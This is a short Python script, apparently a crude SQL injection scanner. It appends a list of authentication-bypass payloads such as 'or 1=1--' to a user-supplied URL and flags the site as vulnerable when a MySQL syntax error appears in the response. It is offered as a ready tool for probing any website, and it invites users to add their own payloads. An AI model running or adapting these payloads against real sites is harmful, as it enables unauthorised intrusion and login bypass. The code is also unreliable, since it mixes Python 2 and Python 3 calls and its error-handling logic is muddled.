import sys
import urllib

fullurl = input("Url: ")
errormsg = "You have an error in your SQL syntax"
payloads = ["", "'=1\' or \'1\' = \'1\'", "'or 1=1", "'1 'or' 1 '=' 1", "'or 1=1#", "'0 'or' 0 '=' 0", "'admin'or 1=1 or ''='", "'admin' or 1=1", "'admin' or '1'='1", "'or 1=1/*", "'or 1=1--"] #whatever payloads you want here ## YOU CAN ADD YOUR OWN
errorr = "yes"
fullbody=" "
for payload in payloads:
    try:
        payload = payload
        resp = urllib.urlopen(fullurl + payload)
        print(resp)
        body = resp.read()
        print(body)
        fullbody = body.decode('utf-8')
    except:
        print("[-] Error! Manually check this payload: " + payload)
        errorr = "no"
        #sys.exit()
    if errormsg in fullbody:
        if errorr == "no":
            print("[-] That payload might not work!")
            errorr = "yes"
        else:
            print("[+] The website is SQL injection vulnerable! Payload: " + payload)
    else:
        print("[-] The website is not SQL injection vulnerable!")
